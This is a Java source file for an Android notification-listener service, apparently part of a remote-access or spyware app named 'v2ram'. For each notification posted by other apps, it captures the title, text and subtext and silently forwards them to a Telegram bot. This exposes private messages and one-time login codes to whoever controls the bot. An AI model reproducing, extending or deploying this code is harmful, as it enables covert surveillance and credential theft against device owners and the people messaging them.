// language: Java, file: NotificationListener.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotificationListener extends NotificationListenerService {

    static final String TAG = "v2-notif";
    public static volatile NotificationListener S;

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        S = this;
        Log.i(TAG, "connected");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        S = null;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification n = sbn.getNotification();
            if (n == null) return;
            Bundle b = n.extras;
            String title = b.getCharSequence("android.title", "").toString();
            String text = b.getCharSequence("android.text", "").toString();
            String sub = b.getCharSequence("android.subText", "").toString();
            if (title.isEmpty() && text.isEmpty()) return;
            String pkg = sbn.getPackageName();
            if (pkg == null || pkg.equals("com.v2ram")) return;

            StringBuilder sb = new StringBuilder();
            sb.append("<b>notif</b> <code>").append(TelegramBot.esc(pkg)).append("</code>\n");
            if (!title.isEmpty()) sb.append("▸ ").append(TelegramBot.esc(title)).append("\n");
            if (!sub.isEmpty()) sb.append("  <i>").append(TelegramBot.esc(sub)).append("</i>\n");
            if (!text.isEmpty()) sb.append(TelegramBot.esc(text));
            new Thread(() -> TelegramBot.send(sb.toString())).start();
        } catch (Throwable t) {
            Log.w(TAG, "notif err", t);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}